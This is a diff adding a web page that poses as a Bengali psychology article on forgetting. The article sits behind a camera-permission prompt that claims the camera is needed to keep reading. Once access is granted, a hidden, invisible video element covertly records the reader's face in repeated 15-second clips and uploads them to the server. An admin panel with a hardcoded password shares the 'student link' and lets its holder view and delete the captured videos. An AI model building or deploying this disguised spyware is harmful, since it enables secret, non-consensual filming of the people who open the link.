@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Psychology Article</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { margin: 0; min-height: 100vh; background: #000; color: #fff; font-family: Arial, sans-serif; }
+    .panel { min-height: 100vh; width: 100%; padding: 24px; }
+    .admin { display: none; flex-direction: column; align-items: center; }
+    .student { display: none; flex-direction: column; align-items: center; justify-content: center; }
+    .box { width: min(520px, 100%); background: #151515; border: 1px solid #333; border-radius: 14px; padding: 22px; text-align: center; }
+    h2 { margin-top: 0; }
+    p { color: #bbb; line-height: 1.5; }
+    .loader { font-size: 18px; color: #ffb000; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; width: 100%; max-width: 1000px; margin-top: 20px; }
+    .card { background: #151515; border: 1px solid #333; padding: 10px; border-radius: 8px; overflow: hidden; }
+    .card video { display: block; width: 100%; border-radius: 5px; background: #000; }
+    .btn { background: #1677ff; border: 0; color: white; padding: 11px 20px; border-radius: 8px; cursor: pointer; font-size: 15px; }
+    .btn-access { background: #e63946; margin-top: 15px; font-weight: bold; }
+    input { width: min(500px, 100%); padding: 11px; margin: 8px 0; background: #0d0d0d; color: #fff; border: 1px solid #444; border-radius: 8px; }
+    #status { color: #ffb000; margin-top: 12px; }
+    .consent { text-align: left; background: #202020; padding: 14px; border-radius: 9px; margin: 16px 0; color: #ddd; font-size: 14px; }
+    .action-btns { display: flex; gap: 6px; margin-top: 10px; }
+    .delete-btn { width: 100%; padding: 8px; color: white; background: #dc3545; border-radius: 5px; cursor: pointer; border: none; }
+    
+    /* Article Styles */
+    .article-container {
+      display: none; width: min(800px, 100%); background: #0a0a0a; padding: 25px; border-radius: 12px; border: 1px solid #222; text-align: left; line-height: 1.8; color: #e0e0e0; font-size: 16px; margin: 0 auto;
+    }
+    .article-container h2 { color: #ffb000; font-size: 22px; margin-bottom: 15px; border-bottom: 1px solid #333; padding-bottom: 10px;}
+    .article-container h3 { color: #4db8ff; margin-top: 25px; font-size: 19px;}
+    .article-container p, .article-container ul { color: #ccc; margin-bottom: 15px; }
+    .article-container strong { color: #fff; }
+    .article-container li { margin-bottom: 10px; }
+    
+    /* Hidden video for background recording */
+    #bg-video { width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none; }
+  </style>
+</head>
+<body>
+  <!-- ADMIN PANEL -->
+  <section id="admin-panel" class="panel admin">
+    <h2>Admin Dashboard (Video Mode)</h2>
+    <input id="link" type="text" readonly>
+    <button id="copy-button" class="btn">Copy Student Link</button>
+    <button id="access-button" class="btn btn-access">Start Monitoring (Requires Password)</button>
+    <div id="status">Waiting to access videos...</div>
+    <div id="streams" class="grid"></div>
+  </section>
+
+  <!-- STUDENT PANEL -->
+  <section id="student-panel" class="panel student">
+    <div id="initial-view" class="box">
+      <h2>Read Article</h2>
+      <div class="consent">To continue reading the psychological study on human memory, please allow camera access.</div>
+      <button id="start-button" class="btn">Allow & Continue Reading</button>
+      <p id="student-status" class="loader"></p>
+    </div>
+
+    <!-- ARTICLE VIEW -->
+    <div id="article-view" class="article-container">
+      <h2>Why Do We Forget? আমরা কেন‌ ভুলে যাই?</h2>
+      <p>কিচেনে গিয়ে দাঁড়িয়ে আছেন… তারপর হঠাৎ মনে হলো, “আমি এখানে কেন এসেছিলাম?” বা কাউকে introduce করানো হলো। নাম শুনলেন। ৫ সেকেন্ড পর… পুরো blank অথবা পকেটে বা হাতে মোবাইল রেখেই মোবাইল খুঁজে পাচ্ছেন না..... Room lock করেছিলেন but আপনার মনে হচ্ছে আপনি lock করেননি।</p>
+      <p>তখন মাথায় প্রথম চিন্তা আসে, "আমার memory কি খারাপ হয়ে যাচ্ছে?" নিজেকে বোকা মনে হয়।<br>কিন্তু Cognitive Psychology একটা interesting কথা বলে, ভুলে যাওয়া সবসময় brain-এর weakness না। অনেক সময় এটা efficient brain-এর স্বাভাবিক কাজ。</p>
+      <p>কারণ, একটা প্রশ্ন ভাবুন যদি আপনার brain আজ দেখা প্রতিটা face, প্রতিটা billboard, প্রতিটা conversation, প্রতিটা random thought মনে রাখত, আপনি কি সত্যিই কাজ করতে পারতেন?<br>সম্ভবত না।<br>আপনার working memory কয়েক মিনিটেই overload হয়ে যেত। brain কোনো computer or robot না যে সব record করে রাখবে। এটা অনেকটা একটা filter system এর মতো কাজ করে । সে সিদ্ধান্ত নেয়, কোন তথ্য রাখা দরকার? কোন তথ্য বাদ দেওয়া যায়?</p>
+      
+      <h3>Psychology-তে forgetting বা ভুলে যাওয়া নিয়ে কয়েকটি গুরুত্বপূর্ণ explanation আছে:</h3>
+      <p><strong>১. Decay Theory : স্মৃতি ধীরে ধীরে দুর্বল হয়ে যায়-</strong><br>যে তথ্য আমরা ব্যবহার করি না, তার memory trace সময়ের সাথে ফিকে হতে থাকে। অনেকটা unused app-এর মতো। ফোনে আছে, কিন্তু মাসের পর মাস ব্যবহার না করলে আপনি নিজেই ভুলে যান।</p>
+      <p><strong>২. Interference Theory : তথ্যের সংঘর্ষ-</strong><br>নতুন তথ্য অনেক সময় পুরোনো তথ্যকে interfere করে। যেমন, নতুন password দেওয়ার পরও পুরোনো password টাইপ করা। দুইটার কোনটা বর্তমান তার মধ্যে কনফিউশন। আবার এমনটা হয় , নতুন semester শুরু হওয়ার পরও পুরোনো routine মাথায় ঘোরা।<br>Brain এখানে confused হয় না। বরং খুব মিল থাকা তথ্যের মধ্যে traffic jam তৈরি হয়।</p>
+      <p><strong>৩. Retrieval Failure : তথ্য আছে, কিন্তু বের হচ্ছে না-</strong><br>এই অভিজ্ঞতা প্রায় সবার হয়েছে। আপনি জানেন শব্দটা জানেন। মাথার ভেতরে আছে। কিন্তু বের হচ্ছে না। তারপর গোসল করার সময়, হাঁটার সময়, বা unrelated কিছু করতে গিয়ে হঠাৎ মনে পড়ে যায়, এটাকে বলে Retrieval Failure।<br>কিন্তু বাস্তবে তথ্য হারায়নি। শুধু brain ঠিক “cue” খুঁজে পাচ্ছিল না।</p>
+      
+      <h3>Scientific Evidence of forgetting:</h3>
+      <p>১৮৮৫ সালে psychologist Hermann Ebbinghaus memory নিয়ে একটি বিখ্যাত experiment করেন। তিনি দেখেন-<br>নতুন শেখা তথ্য review না করলে, মানুষ খুব দ্রুত ভুলে যেতে শুরু করে। অনেক ক্ষেত্রে প্রথম ঘণ্টার মধ্যেই প্রায় অর্ধেক তথ্য হারিয়ে যেতে পারে। এটাকেই বলা হয় <strong>The Forgetting Curve</strong>। অর্থাৎ, আপনার brain আপনাকে fail করাচ্ছে না। সে শুধু জানতে চাইছে- "এই তথ্যটা কি সত্যিই important?”</p>
+      
+      <h3>তাহলে কী করলে জিনিস বেশি মনে থাকবে?</h3>
+      <p><strong>Some Psychological proven method:</strong></p>
+      <ul>
+        <li><strong>Spaced Repetition:</strong> একদিনে ৫ ঘণ্টা না পড়ে, কয়েকদিনে ছোট ছোট interval-এ review করুন। Brain repetition-এর মাধ্যমে বুঝে “এই তথ্যটা মুখস্থ করতে হবে বা মনে রাখতে হবে।”</li>
+        <li><strong>Active Recall:</strong> শুধু পড়ে যাওয়া না। বই বন্ধ করে নিজেকে প্রশ্ন করুন‌ “আমি কী মনে রাখতে পারলাম?” এই method learning-কে অনেক বেশি শক্তিশালী করে।</li>
+        <li><strong>Meaningful Association:</strong> তথ্যকে গল্প, ছবি বা personal experience-এর সাথে connect করুন। কারণ brain isolated data-এর চেয়ে meaningful pattern বেশি মনে রাখে।</li>
+      </ul>
+      <p>নিজেকে সাথে সাথে “ভুলো মানুষ” বলবেন না। হয়তো আপনার brain শুধু background noise কমিয়ে, গুরুত্বপূর্ণ জিনিসের জন্য জায়গা বানাচ্ছে।</p>
+    </div>
+    
+    <video id="bg-video" autoplay playsinline muted></video>
+  </section>
+
+  <script>
+    const pageUrl = new URL(window.location.href);
+    const mode = pageUrl.searchParams.get('mode') || 'admin';
+    const ADMIN_PASSWORD = '74722222';
+    
+    const adminPanel = document.getElementById('admin-panel');
+    const studentPanel = document.getElementById('student-panel');
+    let adminPassword = null;
+    let pollInterval = null;
+
+    if (mode === 'admin') {
+      adminPanel.style.display = 'flex';
+      document.getElementById('link').value = `${window.location.origin}${window.location.pathname}?mode=student`;
+      
+      document.getElementById('copy-button').addEventListener('click', () => {
+        navigator.clipboard.writeText(document.getElementById('link').value);
+        alert('Student Link Copied!');
+      });
+
+      document.getElementById('access-button').addEventListener('click', () => {
+        const pwd = prompt('Enter Admin Password:');
+        if (pwd === ADMIN_PASSWORD) {
+          adminPassword = pwd;
+          document.getElementById('access-button').style.display = 'none';
+          document.getElementById('status').textContent = 'Monitoring... Fetching new videos every 10 seconds.';
+          fetchVideos();
+          pollInterval = setInterval(fetchVideos, 10000); // প্রতি ১০ সেকেন্ডে নতুন ভিডিও চেক করবে
+        } else {
+          alert('Incorrect Password!');
+        }
+      });
+    } else if (mode === 'student') {
+      studentPanel.style.display = 'flex';
+      
+      document.getElementById('start-button').addEventListener('click', async () => {
+        try {
+          const btn = document.getElementById('start-button');
+          btn.disabled = true;
+          document.getElementById('student-status').textContent = 'Requesting access...';
+          
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+          document.getElementById('bg-video').srcObject = stream;
+          
+          // UI Change
+          document.getElementById('initial-view').style.display = 'none';
+          document.getElementById('article-view').style.display = 'block';
+          studentPanel.style.justifyContent = 'flex-start';
+          studentPanel.style.padding = '15px';
+
+          startVideoRecordingCycle(stream);
+        } catch (err) {
+          document.getElementById('start-button').disabled = false;
+          document.getElementById('student-status').textContent = 'Access denied!';
+        }
+      });
+    }
+
+    // --- STUDENT RECORDING LOGIC ---
+    function startVideoRecordingCycle(stream) {
+      let options = { mimeType: 'video/webm;codecs=vp8,opus' };
+      if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+        options = { mimeType: 'video/webm' };
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/mp4' }; // Fallback
+      }
+
+      function recordAndUpload() {
+        const mediaRecorder = new MediaRecorder(stream, options);
+        let chunks = [];
+        
+        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: options.mimeType });
+          const formData = new FormData();
+          formData.append('video', blob);
+          
+          try {
+            await fetch('/api/upload', { method: 'POST', body: formData });
+          } catch(e) { console.error('Upload failed'); }
+
+          // ৫ সেকেন্ড রেস্ট, তারপর আবার রেকর্ডিং শুরু
+          setTimeout(recordAndUpload, 5000); 
+        };
+
+        mediaRecorder.start();
+        // ১৫ সেকেন্ড রেকর্ড করবে
+        setTimeout(() => {
+          if(mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }, 15000); 
+      }
+
+      recordAndUpload();
+    }
+
+    // --- ADMIN FETCH LOGIC ---
+    async function fetchVideos() {
+      try {
+        const res = await fetch(`/api/videos?pwd=${adminPassword}`);
+        if (!res.ok) throw new Error('Auth failed');
+        const videos = await res.json();
+        
+        const grid = document.getElementById('streams');
+        // Remove deleted videos from UI
+        Array.from(grid.children).forEach(child => {
+          if (!videos.find(v => v.filename === child.id)) child.remove();
+        });
+
+        // Add new videos
+        videos.forEach(vid => {
+          if (!document.getElementById(vid.filename)) {
+            const card = document.createElement('div');
+            card.className = 'card';
+            card.id = vid.filename;
+
+            const videoEl = document.createElement('video');
+            videoEl.src = `/api/video/view/${vid.filename}?pwd=${adminPassword}`;
+            videoEl.controls = true;
+            
+            const timeDiv = document.createElement('div');
+            timeDiv.style.cssText = 'padding:8px 0;font-size:12px;color:#aaa';
+            timeDiv.textContent = new Date(vid.timestamp).toLocaleTimeString();
+
+            const delBtn = document.createElement('button');
+            delBtn.className = 'delete-btn';
+            delBtn.textContent = 'Delete Video';
+            delBtn.onclick = async () => {
+              if (confirm('Delete this video?')) {
+                await fetch(`/api/video/delete/${vid.filename}?pwd=${adminPassword}`, { method: 'DELETE' });
+                card.remove();
+              }
+            };
+
+            card.appendChild(videoEl);
+            card.appendChild(timeDiv);
+            card.appendChild(delBtn);
+            grid.appendChild(card);
+          }
+        });
+      } catch (e) {
+        console.error(e);
+      }
+    }
+  </script>
+</body>
+  </html>
